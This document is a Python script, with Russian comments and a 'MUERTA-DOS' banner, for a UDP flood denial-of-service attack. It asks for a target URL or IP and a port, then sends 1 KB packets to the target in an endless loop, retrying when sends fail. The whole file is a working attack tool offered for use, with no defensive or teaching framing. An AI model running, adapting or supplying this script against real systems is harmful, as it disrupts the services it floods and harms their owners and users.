import socket
import threading
import time
import signal
import sys

# ASCII баннер
banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

███╗░░░███╗██╗░░░██╗███████╗██████╗░████████╗░█████╗░░░░░░░██████╗░░█████╗░░██████╗
████╗░████║██║░░░██║██╔════╝██╔══██╗╚══██╔══╝██╔══██╗░░░░░░██╔══██╗██╔══██╗██╔════╝
██╔████╔██║██║░░░██║█████╗░░██████╔╝░░░██║░░░███████║█████╗██║░░██║██║░░██║╚█████╗░
██║╚██╔╝██║██║░░░██║██╔══╝░░██╔══██╗░░░██║░░░██╔══██║╚════╝██║░░██║██║░░██║░╚═══██╗
██║░╚═╝░██║╚██████╔╝███████╗██║░░██║░░░██║░░░██║░░██║░░░░░░██████╔╝╚█████╔╝██████╔╝
╚═╝░░░░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═════╝░░╚════╝░╚═════╝░

1. Target
2. Open port
3. Death

"""
print(banner)

# ANSI-коды для цветного текста
RED = "\033[91m"
RESET = "\033[0m"

# Функция для обработки SIGINT (Control + C)
def signal_handler(sig, frame):
    print("\nОстановка скрипта...")
    sys.exit(0)

# Функция для отправки тяжелых пакетов
def send_packets(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    # Создание большого пакета данных (например, 1 КБ)
    large_packet = b'A' * 1024  # 1 КБ
    packet_count = 0  # Счетчик отправленных пакетов

    while True:
        try:
            sock.sendto(large_packet, (target_ip, target_port))
            packet_count += 1
            print(f"{RED}Тяжелый пакет отправлен на {target_ip}:{target_port} (Всего отправлено: {packet_count}){RESET}")
            time.sleep(0.001)  # Задержка 0.001 миллисекунд между отправками
        except socket.error as e:
            print(f"Ошибка: {e}")
            print("Сервер может блокировать запросы. Ожидание перед повторной попыткой...")
            time.sleep(2)  # Задержка перед повторной попыткой

def main():
    signal.signal(signal.SIGINT, signal_handler)  # Установка обработчика сигнала

    target = input("Введите URL или IP адрес: ")
    port = int(input("Введите открытый порт: "))

    # Удаление протокола из URL (если он присутствует)
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]

    # Попробуем преобразовать URL в IP
    try:
        target_ip = socket.gethostbyname(target)  # Преобразование URL в IP
        print(f"IP адрес для {target}: {target_ip}")
    except socket.gaierror:
        print("Не удалось разрешить указанный URL или IP адрес. Проверьте правильность ввода.")
        return

    print(f"Начинаем отправку тяжелых пакетов на {target_ip}:{port}...")
    send_thread = threading.Thread(target=send_packets, args=(target_ip, port))
    send_thread.start()

if __name__ == "__main__":
    main()
